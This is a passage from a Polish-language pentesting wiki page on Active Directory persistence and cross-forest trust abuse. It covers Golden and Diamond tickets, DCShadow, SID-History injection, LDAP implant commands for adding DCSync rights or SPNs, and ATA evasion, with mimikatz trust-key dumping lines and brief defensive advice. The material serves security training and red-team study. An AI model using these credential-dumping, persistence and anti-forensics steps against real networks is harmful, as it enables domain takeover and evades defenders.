Atak **Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **NTLM hash** konta krbtgt w środowisku Active Directory. To konto jest specjalne, ponieważ służy do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Gdy atakujący zdobędzie ten hash, może tworzyć **TGTs** dla dowolnego konta, które wybierze (atak Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}

### Diamond Ticket

Są to bilety podobne do golden tickets, podrobione w taki sposób, że **ominięte zostają typowe mechanizmy wykrywania golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}

### **Certificates Account Persistence**

**Posiadanie certyfikatów konta lub możliwość ich wystawiania** jest bardzo dobrym sposobem na utrzymanie persistence w koncie użytkownika (nawet jeśli zmieni on hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}

### **Certificates Domain Persistence**

**Wykorzystanie certyfikatów umożliwia także utrzymanie wysokich uprawnień w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}

### AdminSDHolder Group

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (jak Domain Admins i Enterprise Admins) przez zastosowanie standardowego **ACL** do tych grup, aby zapobiec nieautoryzowanym zmianom. Jednak ta funkcja może zostać wykorzystana; jeśli atakujący zmodyfikuje ACL AdminSDHolder, aby nadać pełny dostęp zwykłemu użytkownikowi, ten użytkownik zyska rozległą kontrolę nad wszystkimi uprzywilejowanymi grupami. Mechanizm ten, mający chronić, może więc działać odwrotnie, umożliwiając niepożądany dostęp, jeśli nie jest ściśle monitorowany.

[**Więcej informacji o AdminDSHolder Group tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

W każdym **Domain Controller (DC)** istnieje konto **lokalnego administratora**. Uzyskując prawa administratora na takiej maszynie, hash lokalnego Administratora można wyciągnąć za pomocą **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **umożliwić użycie tego hasła**, co pozwala na zdalny dostęp do konta lokalnego Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}

### ACL Persistence

Możesz **przyznać** pewne **specjalne uprawnienia** użytkownikowi na niektórych obiektach domenowych, które pozwolą temu użytkownikowi **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}

### Security Descriptors

**Security descriptors** są używane do **przechowywania** **uprawnień**, które obiekt posiada **w stosunku do** innego **obiektu**. Jeśli możesz dokonać nawet **niewielkiej zmiany** w **security descriptor** obiektu, możesz uzyskać bardzo interesujące uprawnienia do tego obiektu bez konieczności bycia członkiem uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}

### Dynamic Objects Anti-Forensics / Evasion

Nadużyj auxiliary class `dynamicObject`, aby tworzyć krótkotrwałe principals/GPO/DNS recordy z `entryTTL`/`msDS-Entry-Time-To-Die`; usuwają się same bez tombstonów, wymazując dowody w LDAP, pozostawiając jednocześnie osierocone SIDy, uszkodzone referencje `gPLink` lub zbuforowane odpowiedzi DNS (np. zanieczyszczenie ACE AdminSDHolder lub złośliwe `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}

### Skeleton Key

Zmień **LSASS** w pamięci, aby ustawić **uniwersalne hasło**, dając dostęp do wszystkich kont domenowych.


{{#ref}}
skeleton-key.md
{{#endref}

### Custom SSP

[Dowiedz się, czym jest SSP (Security Support Provider) tutaj.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz stworzyć własne **SSP**, aby **przechwytywać** w **czystym tekście** **poświadczenia** używane do dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i wykorzystuje go do **wypychania atrybutów** (SIDHistory, SPNs...) na wybranych obiektach **bez** pozostawiania jakichkolwiek **logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień DA i musisz być wewnątrz **root domain**.\
Uwaga: jeśli użyjesz błędnych danych, pojawią się dość brzydkie logi.


{{#ref}}
dcshadow.md
{{#endref}

### LAPS Persistence

Wcześniej omówiliśmy, jak eskalować uprawnienia mając **wystarczające uprawnienia do czytania haseł LAPS**. Jednak te hasła mogą być także wykorzystane do **utrzymania persistence**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}

## Forest Privilege Escalation - Domain Trusts

Microsoft postrzega **Forest** jako granicę bezpieczeństwa. Oznacza to, że **skompro-mitowanie pojedynczej domeny może potencjalnie doprowadzić do kompromitacji całego Forest**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa umożliwiający użytkownikowi z jednej **domeny** dostęp do zasobów w innej **domenie**. Tworzy on powiązanie między systemami uwierzytelniania obu domen, pozwalając na przepływ weryfikacji uwierzytelnienia. Gdy domeny ustanawiają trust, wymieniają i przechowują specyficzne **klucze** w swoich **Domain Controllerach (DCs)**, które są kluczowe dla integralności trustu.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **zaufanej domenie**, musi najpierw poprosić o specjalny bilet znany jako **inter-realm TGT** od DC swojej własnej domeny. Ten TGT jest szyfrowany przy użyciu wspólnego **klucza**, który obie domeny uzgodniły. Następnie użytkownik przedstawia ten TGT **DC zaufanej domeny**, aby uzyskać bilet usługowy (**TGS**). Po pomyślnej weryfikacji inter-realm TGT przez DC zaufanej domeny, wydaje ona TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. Komputer-klient w **Domain 1** rozpoczyna proces, używając swojego **NTLM hash**, aby zażądać **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wydaje nowy TGT, jeżeli klient zostanie pomyślnie uwierzytelniony.
3. Klient następnie żąda **inter-realm TGT** od DC1, który jest potrzebny do uzyskania zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany wspólnym **kluczem trustu** dzielonym między DC1 i DC2 jako częścią relacji dwukierunkowego trustu domen.
5. Klient przenosi inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 weryfikuje inter-realm TGT używając swojego współdzielonego klucza trustu i, jeśli jest ważny, wydaje **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. Na koniec klient przedstawia ten TGS serwerowi, który jest zaszyfrowany hashem konta serwera, aby uzyskać dostęp do usługi w Domain 2.

### Different trusts

Ważne jest, aby zauważyć, że **trust może być jednokierunkowy lub dwukierunkowy**. W opcji dwukierunkowej obie domeny będą sobie ufać, ale w relacji **jednokierunkowej** jedna z domen będzie **trusted**, a druga **trusting**. W tym ostatnim przypadku **będziesz mógł uzyskać dostęp tylko do zasobów w trusting domain z poziomu trusted domain**.

Jeśli Domain A ufa Domain B, A jest domeną trusting, a B jest trusted. Co więcej, w **Domain A** będzie to **Outbound trust**; a w **Domain B** będzie to **Inbound trust**.

**Różne relacje zaufania**

- **Parent-Child Trusts**: Typowe ustawienie w obrębie tego samego forest, gdzie domena child automatycznie ma dwukierunkowy transitive trust z domeną parent. Oznacza to, że żądania uwierzytelnienia mogą swobodnie przepływać między parent i child.
- **Cross-link Trusts**: Nazywane też "shortcut trusts", ustanawiane między domenami child, aby przyspieszyć procesy referral. W skomplikowanych forest referencje uwierzytelnienia zwykle muszą podróżować do root forest i stamtąd do docelowej domeny. Tworząc cross-links, skraca się tę drogę, co jest szczególnie korzystne w rozproszonych geograficznie środowiskach.
- **External Trusts**: Ustanawiane między różnymi, niepowiązanymi domenami i są z natury non-transitive. Według [dokumentacji Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts są przydatne do uzyskiwania dostępu do zasobów w domenie spoza bieżącego forest, która nie jest połączona przez forest trust. Bezpieczeństwo jest wzmacniane przez SID filtering w external trusts.
- **Tree-root Trusts**: Te trusty są automatycznie ustanawiane między forest root domain a nowo dodanym tree root. Choć rzadko spotykane, tree-root trusts są ważne przy dodawaniu nowych drzew domen do forest, pozwalając im zachować unikalną nazwę domeny i zapewniając dwukierunkową transitywność. Więcej informacji w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trustu to dwukierunkowy transitive trust między dwoma forest root domains, również wymusza SID filtering w celu zwiększenia bezpieczeństwa.
- **MIT Trusts**: Trusty ustanawiane z nie-Windowsowymi, zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120) domenami Kerberos. MIT trusts są bardziej wyspecjalizowane i służą do integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Other differences in **trusting relationships**

- Relacja trustu może być także **transitive** (A ufa B, B ufa C, więc A ufa C) lub **non-transitive**.
- Relacja trustu może być ustawiona jako **bidirectional trust** (obie ufają sobie) lub jako **one-way trust** (tylko jedna ufa drugiej).

### Attack Path

1. **Enumeruj** relacje zaufania
2. Sprawdź, czy któryś **security principal** (user/group/computer) ma **dostęp** do zasobów **innej domeny**, np. przez wpisy ACE lub przez członkostwo w grupach innej domeny. Szukaj **związków między domenami** (prawdopodobnie trust został stworzony dokładnie w tym celu).
1. kerberoast w tym przypadku może być inną opcją.
3. **Skompromituj** **konta**, które mogą **pivotować** między domenami.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie przez trzy główne mechanizmy:

- **Local Group Membership**: Principals mogą być dodani do lokalnych grup na maszynach, takich jak grupa “Administrators” na serwerze, dając im znaczną kontrolę nad tą maszyną.
- **Foreign Domain Group Membership**: Principals mogą także być członkami grup w domenie obcej. Jednak skuteczność tej metody zależy od natury trustu i zakresu grupy.
- **Access Control Lists (ACLs)**: Principals mogą być wyspecyfikowani w **ACL**, szczególnie jako podmioty w **ACE** wewnątrz **DACL**, dając im dostęp do konkretnych zasobów. Dla tych, którzy chcą zagłębić się w mechanikę ACL, DACL i ACE, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” jest nieocenionym źródłem.

### Find external users/groups with permissions

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/forest**.

Możesz to sprawdzić w **Bloodhound** lub używając **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby enumeracji zaufania domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 trusted keys**, jedna dla _Child --> Parent_ i druga dla _Parent_ --> _Child_.\
> Możesz sprawdzić, która jest używana przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaluje do Enterprise admin w domenie child/parent, nadużywając zaufania przez SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie, jak można wykorzystać Configuration Naming Context (NC), jest kluczowe. Configuration NC pełni rolę centralnego repozytorium danych konfiguracyjnych w całym lesie w środowiskach Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, a writable DCs utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **SYSTEM privileges on a DC**, najlepiej na child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o site'ach wszystkich komputerów dołączonych do domeny w lesie AD. Działając z **SYSTEM privileges on any DC**, atakujący mogą powiązać GPOs z root DC sites. Ta akcja potencjalnie kompromituje domenę root przez manipulowanie politykami stosowanymi dla tych site'ów.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jednym z wektorów ataku jest celowanie w uprzywilejowane gMSA w domenie. KDS Root key, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając **SYSTEM privileges on any DC**, możliwe jest uzyskanie dostępu do KDS Root key i obliczenie haseł dla dowolnego gMSA w całym lesie.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ta metoda wymaga cierpliwości i oczekiwania na tworzenie nowych uprzywilejowanych obiektów AD. Mając **SYSTEM privileges**, atakujący może zmodyfikować AD Schema, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. To może prowadzić do nieautoryzowanego dostępu i kontroli nad nowo tworzonymi obiektami AD.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 celuje w kontrolę nad obiektami Public Key Infrastructure (PKI), aby utworzyć szablon certyfikatu umożliwiający uwierzytelnienie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, kompromitacja writable child DC umożliwia przeprowadzenie ataków ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). W scenariuszach bez ADCS, atakujący ma możliwość skonfigurowania niezbędnych komponentów, o czym dyskutuje się w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **twoja domena jest zaufana** przez domenę zewnętrzną, co daje ci **nieokreślone uprawnienia** nad nią. Musisz ustalić, **które konta/principale twojej domeny mają jakie uprawnienia wobec domeny zewnętrznej**, a następnie spróbować je wykorzystać:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu - jednokierunkowa (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **your domain** **trusting** pewne **privileges** do principal z **different domains**.

Jednak gdy **domain is trusted** przez domenę ufającą, trusted domain **creates a user** o **predictable name**, który używa jako **password the trusted password**. Oznacza to, że możliwe jest, by **access a user from the trusting domain to get inside the trusted one**, aby je zenumerować i próbować eskalować więcej uprawnień:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Inny sposób kompromitacji trusted domain to znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **opposite direction** trustu domeny (co nie jest zbyt częste).

Inny sposób kompromitacji trusted domain to oczekiwanie na maszynie, do której **user from the trusted domain can access** i zaloguje się przez **RDP**. Wtedy atakujący może wstrzyknąć kod w proces sesji RDP i **access the origin domain of the victim** stamtąd.  
Co więcej, jeśli **victim mounted his hard drive**, z procesu **RDP session** atakujący może zapisać **backdoors** w **startup folder of the hard drive**. Ta technika nazywa się **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigacje nadużyć trustu domeny

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w ramach forest trusts jest łagodzone przez SID Filtering, które jest aktywowane domyślnie dla wszystkich inter-forest trusts. Opiera się to na założeniu, że intra-forest trusts są bezpieczne, traktując forest, a nie domain, jako granicę bezpieczeństwa zgodnie ze stanowiskiem Microsoft.
- Jest jednak haczyk: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego okazjonalnej dezaktywacji.

### **Selective Authentication:**

- Dla inter-forest trusts zastosowanie Selective Authentication zapewnia, że użytkownicy z dwóch forestów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są explicite uprawnienia, aby użytkownicy mogli uzyskać dostęp do domen i serwerów w ramach trusting domain lub forest.
- Ważne jest, aby zauważyć, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na trust account.

[**Więcej informacji o zaufaniach domen na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Nadużycia AD oparte na LDAP z implantów na hoście

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operatorzy kompilują pakiet poleceniem `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z beacona. Cały ruch korzysta z bieżącego kontekstu bezpieczeństwa logowania przez LDAP (389) z signing/sealing lub LDAPS (636) z automatycznym zaufaniem certyfikatów, więc nie są wymagane socks proxies ani artefakty na dysku.

### Enumeracja LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` przekształcają short names/OU paths w pełne DNs i zrzucają odpowiadające obiekty.
- `get-object`, `get-attribute`, and `get-domaininfo` pobierają dowolne atrybuty (w tym security descriptors) oraz metadata forest/domain z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` ujawniają roasting candidates, ustawienia delegacji oraz istniejące [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors bezpośrednio z LDAP.
- `get-acl` and `get-writable --detailed` parsują DACL, wypisując trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) oraz inheritance, dostarczając natychmiastowych celów do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi umieszczać nowe konta użytkowników lub maszyn tam, gdzie istnieją prawa do OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` bezpośrednio przejmują cele po znalezieniu praw write-property.
- Polecenia skupione na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, tłumaczą WriteDACL/WriteOwner na dowolnym obiekcie AD na reset haseł, kontrolę członkostwa w grupach lub uprawnienia DCSync bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` natychmiast czynią skompromitowanego użytkownika Kerberoastable; `add-asreproastable` (UAC toggle) oznacza go do AS-REP roasting bez dotykania hasła.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) przepisują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z beacona, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę zdalnego PowerShell lub RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` wstrzykuje uprzywilejowane SIDy do sidHistory kontrolowanego principala (zobacz [SID-History Injection](sid-history-injection.md)), zapewniając dyskretne dziedziczenie dostępu w pełni przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przeciągnąć zasoby do OU, gdzie prawa delegowane już istnieją, przed nadużyciem `set-password`, `add-groupmember` lub `add-spn`.
- Ściśle ukierunkowane polecenia usuwające (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) umożliwiają szybki rollback po zebraniu poświadczeń lub ustanowieniu persistencji, minimalizując telemetrykę.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Ogólne środki obronne

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Środki obronne dla ochrony poświadczeń**

- **Domain Admins Restrictions**: Zaleca się, aby członkowie Domain Admins logowali się jedynie na Domain Controllerach, unikając używania ich uprawnień na innych hostach.
- **Service Account Privileges**: Usługi nie powinny działać z uprawnieniami Domain Admin (DA).
- **Temporal Privilege Limitation**: Dla zadań wymagających uprawnień DA, ich czas trwania powinien być ograniczony. Można to osiągnąć np.: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audituj Event IDs 2889/3074/3075, a następnie wymuś LDAP signing oraz LDAPS channel binding na DC/klientach, aby zablokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Wdrażanie technik Deception**

- Wdrażanie deception polega na ustawianiu pułapek, takich jak konta-kamierybki użytkowników lub komputerów, z cechami takimi jak hasła, które nie wygasają, lub oznaczone jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi prawami lub dodawanie ich do grup o wysokich uprawnieniach.
- Praktyczny przykład wykorzystuje narzędzia takie jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej na temat wdrażania deception można znaleźć na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identyfikacja Deception**

- **Dla obiektów użytkownika**: Podejrzane wskaźniki to nietypowe ObjectSID, rzadkie logowania, daty utworzenia oraz niska liczba nieudanych prób logowania.
- **Wskaźniki ogólne**: Porównywanie atrybutów potencjalnych obiektów-kamierybek z rzeczywistymi może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w identyfikacji takich deception.

### **Omijanie systemów wykrywania**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Unikanie enumeracji sesji na Domain Controllerach, aby zapobiec wykryciu przez ATA.
- **Ticket Impersonation**: Wykorzystanie kluczy **aes** do tworzenia ticketów pomaga unikać wykrycia przez brak degradacji do NTLM.
- **DCSync Attacks**: Wykonywanie z hosta innego niż Domain Controller, aby uniknąć wykrycia przez ATA; wykonywanie bezpośrednio z Domain Controller spowoduje alerty.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
